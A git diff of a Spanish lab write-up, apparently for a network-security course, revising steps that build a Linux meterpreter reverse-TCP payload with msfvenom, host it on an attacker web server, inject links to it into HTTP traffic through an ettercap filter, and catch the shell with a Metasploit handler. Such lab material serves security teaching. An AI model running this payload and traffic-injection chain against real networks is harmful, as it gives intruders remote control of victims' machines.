@@ -80,17 +80,19 @@ Se puede ver en *Statistics > HTTP > Requests*
 Instale *Metasploit*. Haga un ejecutable que incluya Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.
 1. Instalamos *Metasplot* siguiente [este tutorial](https://computingforgeeks.com/install-metasploit-framework-on-debian/).
 2. Creamos payload:
-> `msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.50 LPORT=4444 -f elf > payload.bin`
+> `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.48.51 LPORT=5555 -f elf > payload.bin`
 
 > :question: No entiendo que quieres decir a continuación:
 
-3. Subimos el payload a donde sea para poder usarlo, como por ejemplo `tempfiles.org`
+3. Lo mejor es subir el payload a tu servidor de apache, mueve el archivo con
 
-4. Creamos `ett.filter`:
+> cp payload.bin /var/www/html/
+
+5. Creamos `ett.filter`:
 > `nano ett.filter`
 ```bash
 if (ip.proto == TCP && tcp.src == 80) {
-	replace("a href", "a href=\"https://tmpfiles.org/dl/207895/payload.bin\">");
+	replace("a href", "a href=\"http://10.11.49.54/payload.bin\">");
 	msg("replaced href.\n");
 }
 ```
@@ -106,6 +108,8 @@ if (ip.proto == TCP && tcp.src == 80) {
 - Llegados a este punto, desde el cliente vemos la pagina y nos descargamos el virus:
 >  `lynx http://example.org`
 
+Podemos hacer tambien un curl, y descargar el link del payload con wget
+
 1. Damos permisos de ejecucion 
 > `chmod +x payload.bin`
 
@@ -115,26 +119,17 @@ if (ip.proto == TCP && tcp.src == 80) {
 - Finalmente desde el atacante entramos en la consola de metasploit:
 > `msfconsole`
 ```bash
-msf6 > use multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
-payload => linux/x86/shell/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 10.11.48.50
-LHOST => 10.11.48.50
-msf6 exploit(multi/handler) > set LPORT 4444
-LPORT => 4444
-msf6 exploit(multi/handler) > exploit
-[*] Started reverse TCP handler on 10.11.48.50:4444 
-[*] Sending stage (36 bytes) to 10.11.49.106
-[*] Command shell session 1 opened (10.11.48.50:4444 -> 10.11.49.106:56054) at 2022-11-03 13:55:42 +0100
+use multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 10.11.48.51
+set LPORT 5555
+set ExitOnSession false
+exploit -j -z
 ```
 Ahora estamos dentro del cliente desde el atacante.
 > [!Note]
 > Para salir podemos usar: `msf6 exploit(multi/handler) > exit`
 
-> :question: No entiendo que quieres decir a continuación:
-
-Para comprobar si funciona, en la máquina de la víctima simulamos una descarga del href introducido.
 
 ## APARTADO H
 Haga un MITM en IPv6 y visualice la paquetería.
